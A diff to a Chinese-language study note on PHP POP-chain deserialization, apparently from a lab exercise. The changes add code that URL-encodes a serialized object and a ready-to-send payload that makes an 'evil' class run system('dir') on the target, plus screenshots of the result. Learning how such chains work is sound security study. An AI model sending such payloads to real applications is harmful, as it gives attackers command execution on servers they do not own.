@@ -79,10 +79,25 @@ $a = new index();
 
 echo serialize($a);
 
+$b = urlencode(serialize($a));
+
+echo "\n";
+
+echo $b;
 ?>
 ```
 得到能够触发漏洞的$test
+此时的test赋值为evil的一个对象，并且属性test2赋值为
 ```php
-O:5:"index":1:{s:11:"indextest";O:4:"evil":1:{s:5:"test2";s:13:"system('ls');";}}
+O:5:"index":1:{s:11:"indextest";O:4:"evil":1:{s:5:"test2";s:14:"system('dir');";}}
+
+O%3A5%3A%22index%22%3A1%3A%7Bs%3A11%3A%22%00index%00test%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A14%3A%22system%28%27dir%27%29%3B%22%3B%7D%7D
 ```
 
+本地和靶机效果
+
+![](assets/pop链知识/file-20260112205620134.png)
+
+![](assets/pop链知识/file-20260112205654423.png)
+
+因此通过重构pop链构造出了新的test传入从而触发漏洞点
